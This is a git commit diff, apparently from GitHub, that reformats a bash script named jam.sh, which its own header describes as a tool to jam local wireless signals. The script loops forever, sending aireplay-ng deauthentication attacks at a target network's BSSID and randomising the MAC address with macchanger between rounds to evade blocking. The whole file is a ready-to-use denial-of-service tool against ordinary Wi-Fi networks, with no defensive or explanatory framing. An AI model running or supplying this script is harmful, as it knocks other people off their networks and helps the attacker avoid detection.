2fe3b6788b11b0f9d0dbbf04a71d42f2a28c75ce
Z3r0 K3lv1n <84712952+z3r0-k3lv1n@users.noreply.github.com>
2023-08-10 09:58:32 +1000

    Update jam.sh
    Refactor

--- Sneakers/jam.sh
+++ Sneakers/jam.sh
@@ -1,23 +1,23 @@
-#!/bin/bash\
-\
-# --------------------------------------------------------------------------------\
-#       Bash script to jam local wireless signals.\
-#               1. The script will perform 5 attacks. \
-#               2. It then changes the MAC address and then starts again.\
-#\
-# --------------------------------------------------------------------------------\
-\
-\
-\
-\
+#!/bin/bash
+
+# --------------------------------------------------------------------------------
+#       Bash script to jam local wireless signals.
+#               1. The script will perform 5 attacks. 
+#               2. It then changes the MAC address and then starts again.
+#
+# --------------------------------------------------------------------------------
+
+
+
+
 while [[ true ]]; do\
-        aireplay-ng -0 5 -a [BSSID-Number] wlan0\
-        ifconfig wlan0 down\
-        macchanger -r wlan0 | grep "New MAC"\
-        iwconfig wlan0 mode monitor\
-        ifconfig wlan0 up\
-        iwconfig wlan0 | grep Mode\
-        sleep 3\
-        echo "Waiting!!!!!"\
-\
+        aireplay-ng -0 5 -a [BSSID-Number] wlan0
+        ifconfig wlan0 down
+        macchanger -r wlan0 | grep "New MAC"
+        iwconfig wlan0 mode monitor
+        ifconfig wlan0 up
+        iwconfig wlan0 | grep Mode
+        sleep 3
+        echo "Waiting!!!!!"
+
 done}
